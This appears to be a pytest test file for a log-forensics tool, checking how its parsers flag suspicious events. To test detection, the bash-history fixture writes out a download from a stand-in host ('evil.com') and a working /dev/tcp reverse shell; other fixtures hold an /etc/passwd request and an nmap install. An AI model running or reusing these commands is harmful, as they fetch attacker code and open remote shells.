import sys
import tempfile
from pathlib import Path
from datetime import timezone
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from parsers.syslog_parser    import SyslogParser
from parsers.auth_parser      import AuthLogParser
from parsers.dpkg_parser      import DpkgParser
from parsers.apache_access_parser import ApacheAccessParser
from parsers.bash_history_parser  import BashHistoryParser
from parsers.wtmp_parser      import WtmpParser


def _write(tmp_dir, filename, content):
    p = Path(tmp_dir) / filename
    p.write_text(content, encoding='utf-8')
    return p


def test_syslog_parser_basic():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'syslog',
                   'Apr 22 09:15:33 hostname sshd[1234]: some message here\n')
        parser = SyslogParser()
        assert parser.can_parse(p)
        events = parser.safe_parse(p)
        assert len(events) == 1
        assert events[0].process == 'sshd'
        assert events[0].source  == 'syslog'


def test_syslog_severity_high():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'syslog',
                   'Apr 22 09:15:33 host proc[1]: CRITICAL error occurred\n')
        events = SyslogParser().safe_parse(p)
        assert events[0].severity == 'high'


def test_auth_ssh_success():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'auth.log',
                   'Apr 22 09:15:33 host sshd[1]: Accepted password for alice from 10.0.0.1 port 22\n')
        events = AuthLogParser().safe_parse(p)
        ssh_events = [e for e in events if e.event_type == 'ssh_login_success']
        assert len(ssh_events) >= 1
        assert ssh_events[0].user == 'alice'
        assert ssh_events[0].ip   == '10.0.0.1'


def test_auth_ssh_fail():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'auth.log',
                   'Apr 22 09:15:33 host sshd[1]: Failed password for bob from 1.2.3.4 port 22\n')
        events = AuthLogParser().safe_parse(p)
        fails  = [e for e in events if e.event_type == 'ssh_login_failed']
        assert len(fails) >= 1
        assert fails[0].severity == 'high'


def test_dpkg_suspicious_tool():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'dpkg.log',
                   '2026-04-22 09:15:33 install nmap:amd64 <none>\n')
        events = DpkgParser().safe_parse(p)
        assert len(events) == 1
        assert events[0].severity == 'high'


def test_dpkg_normal():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'dpkg.log',
                   '2026-04-22 09:15:33 install curl:amd64 7.81.0\n')
        events = DpkgParser().safe_parse(p)
        assert events[0].severity == 'info'


def test_apache_suspicious_path():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'access.log',
                   '1.2.3.4 - - [22/Apr/2026:09:15:33 +0000] '
                   '"GET /etc/passwd HTTP/1.1" 200 512 "-" "curl/7.0"\n')
        events = ApacheAccessParser().safe_parse(p)
        assert len(events) == 1
        assert events[0].severity == 'high'


def test_apache_500():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, 'access.log',
                   '1.2.3.4 - - [22/Apr/2026:09:15:33 +0000] '
                   '"GET /index.html HTTP/1.1" 500 0 "-" "-"\n')
        events = ApacheAccessParser().safe_parse(p)
        assert events[0].severity == 'high'


def test_bash_history_suspicious():
    with tempfile.TemporaryDirectory() as tmp:
        p = _write(tmp, '.bash_history', 'wget http://evil.com/shell.sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n')
        events = BashHistoryParser().safe_parse(p)
        high_events = [e for e in events if e.severity == 'high']
        assert len(high_events) >= 1


def test_parser_can_parse_routing():
    from pathlib import Path
    syslog_p = Path('/var/log/syslog')
    auth_p   = Path('/var/log/auth.log')
    assert SyslogParser().can_parse(syslog_p)
    assert AuthLogParser().can_parse(auth_p)
    assert not SyslogParser().can_parse(Path('/var/log/dpkg.log'))


def test_wtmp_empty_file():
    with tempfile.TemporaryDirectory() as tmp:
        p = Path(tmp) / 'wtmp'
        p.write_bytes(b'')
        events = WtmpParser().safe_parse(p)
        assert events == []
